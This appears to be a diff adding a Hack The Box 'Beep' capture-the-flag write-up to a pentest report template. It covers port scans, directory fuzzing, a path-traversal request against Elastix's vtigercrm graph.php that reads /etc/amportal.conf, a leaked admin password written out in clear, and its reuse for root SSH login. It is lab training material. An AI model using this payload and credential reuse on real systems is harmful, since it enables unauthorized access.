@@ -14,7 +14,7 @@ book: true
 classoption: oneside
 code-block-font-size: \scriptsize
 ---
-# Lab name Report
+# Beep
 
 ## Introduction
 
@@ -22,11 +22,11 @@ This report is about pentesting a specific machine to see if it's well secured. 
 
 ## Objective
 
-Run an analysis onto a specific machine ...
+Run an analysis onto a specific machine 10.129.87.168
 
 ## Perimeter
 
-Only this machine (...) with specific tools
+Only this machine (10.129.87.168 ) with specific tools
 
 - nmap
 - masscan
@@ -95,7 +95,7 @@ Check other recommendations at the end of this document.
 
 # Soluces
 
-[ippsec video of shocker](https://www.youtube.com/watch?v=XJmBpOd__N8)  
+[ippsec video of Beep](https://www.youtube.com/watch?v=XJmBpOd__N8)  
 [soluces from ](https://github.com/michoo/sec-learning/blob/master/soluces/1_Linux/beep-writeup-w-o-metasploit.md)  
 [soluces from Hack the box](https://github.com/michoo/sec-learning/blob/master/1_Linux/Beeo/soluce/Beep.pdf)
 
@@ -113,16 +113,41 @@ The specific IP addresse was:
 
 **Scope**
 
-- 192.168.
-- 192.168.
-- 192.168.
-- 192.168.
-- 192.168.
+- 10.129.87.168  
 
-My attacking ip machine was 10.10....
+My attacking ip machine was 10.10.14.91
 
-## System IP: 192.168.x.x
+First we have to start access to Hackthebox network.  
+
+```bash
+sudo openvpn file.ovpn
+```
+
+## System IP: 10.129.87.168  
 ### Enumeration
+
+First scan on all ports on tcp and udp
+```bash
+sudo masscan -p1-65535,U:1-65535 10.129.87.168 --rate=500
+```
+
+Second finest scan with [Nmap](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/) 
+```bash
+nmap -n -v -Pn -sS -sU -pT:22,80,U:161 -A --reason 10.129.87.168 -oN nmap.txt
+```
+
+```bash
+mkdir nmap
+sudo nmap -sC -sV -O -oA nmap/initial 10.129.87.168
+    -sC: run default nmap scripts
+    -sV: detect service version
+    -O: detect OS
+    -oA: output all formats and store in file nmap/initial
+
+```
+
+![result scan 1](images/nmap1-Screenshot_2021-01-28_14-23-16.png)  
+![result scan 2](images/nmap2-Screenshot_2021-01-28_14-23-16.png)  
 
 #### TCP
 
@@ -130,17 +155,105 @@ My attacking ip machine was 10.10....
 
 #### Web Services
 
+On port 80:  
+![Elastix](images/TLS1-Screenshot_2021-01-28_14-45-03.png)
+
+```bash
+wfuzz -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e magictree -t 20 --hc '403,404' http://10.129.87.168/FUZZ > wfuzz.results
+```
+
+NB: check folder /usr/share/wfuzz/wordlist/
+
+-> nothing really usefull (sorry no printscreen)
+
+
 #### Other Services
 
 #### Harvested Informations
+Seems that is a web application for an IPBX solution called Elastix.
+
+By navigating we tried simply http://10.129.87.168/admin/ and we found:  
+
+![admin auth](images/admin-Screenshot_2021-01-28_14-55-10.png)
+
+When cancel we fall back into a screen from FreePBX maybe the opensource solution on top of Elastix stack.
+
+We gathered a version information  
+
+![freepbx version](images/VersionFreePBX-Screenshot_2021-01-28_14-54-31.png)
+
+-> freePBX version is 2.8.1.4
+
 
 #### Vuln Investigation
 
 ##### Check for exploits
 
+```bash
+searchsploit --id freepbx
+searchsploit --id elastix
+```
+![freepbx results](images/freePBX-Screenshot_2021-01-28_15-04-13.png)
+![elastix results](images/Elastix-Screenshot_2021-01-28_15-04-37.png)
+
+tried some but this one is good for elastix https://www.exploit-db.com/exploits/37637
+
+
+
+##### Check for informations on web
+
+N/A
+
 ### Penetration
 
+```http
+https://10.129.87.168/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
+
+```
+
+![Interesting conf file](images/Vuln-Screenshot_2021-01-28_15-10-10.png)  
+
+![mysql user/password](images/mysql-Screenshot_2021-01-28_15-16-32.png)  
+
+-> not working outside localhost  
+![mysql try](images/mysl-try-Screenshot_2021-01-28_15-21-17.png)   
+
+
+![elastix admin password!!!!](images/admin-password-Screenshot_2021-01-28_15-12-14.png)  
+
+-> let's use it admin/jEhdIekWmdjE
+
+On FreePBX:  
+Many menus, some pistes
+![java ssh but some issues to access jar. Tried to download but not working but info saying that it connects you as root](images/Freepbx-javassh-Screenshot_2021-01-28_15-45-15.png)  
+![playing around... maybe later update to get more vuln](images/Freepbx-notices-Screenshot_2021-01-28_15-42-50.png)  
+![php version](images/php-version-Screenshot_2021-01-28_15-18-14.png)  
+
+On Elastix: 
+![add to activate tls1](images/TLS1-Screenshot_2021-01-28_14-45-03.png)   
+![first connection](images/Elastix-connected-as-adminScreenshot_2021-01-28_15-24-40.png)  
+![some info](images/Elastix-info-Screenshot_2021-01-28_15-27-17.png)  
+![all versions](images/Elastix-info2-Screenshot_2021-01-28_15-36-41.png)  
+![the good mysql config](images/Elastix-mysql-config-Screenshot_2021-01-28_15-31-56.png)  
+![some try on backup conf file but not downloadable directly, I have to dig into doc if necessary](images/backup-confiles-Screenshot_2021-01-28_15-25-46.png)  
+
+
+-> nothing
+
+Let's check ssh with admin/jEhdIekWmdjE
+
+with admin it's not working, let's try with root as in java ssh and same password
+
+![And boom!](images/root-Screenshot_2021-01-28_15-51-59.png)
+
+
+
 ### Post exploitation
+
+```bash
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c 3des-cbc root@10.129.87.168 
+cat root.txt
+```
 
 #### Host Information
 
@@ -181,7 +294,11 @@ My attacking ip machine was 10.10....
 **Proof Screenshot Here:**
 
 **Proof.txt Contents:**
+```bash
+[root@beep ~] cat root.txt 
+fb691079a0a90338eb4541aafe21----
 
+```
 ## Maintaining Access
 
 Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
@@ -200,10 +317,15 @@ Offensive Security should not have to remove any user accounts or services from 
 # Detailed Recommandations
 
 ## Technical
+- no opening ssh to root
+- patching old version
+
 
 ## Governance
 
 ## Blue team
+- ???
+
 
 # Additional Items
 
@@ -211,18 +333,5 @@ Offensive Security should not have to remove any user accounts or services from 
 
 IP (Hostname) | Local.txt Contents | Proof.txt Contents
 --------------|--------------------|-------------------
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
-192.168.x.x   | hash_here          | hash_here
+10.129.87.168  | N/A          | fb691079a0a90338eb4541aafe21----
 
-## Appendix - Metasploit/Meterpreter Usage
-
-For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`
-
-## Appendix - Completed Buffer Overflow Code
-
-```
-code here
-```
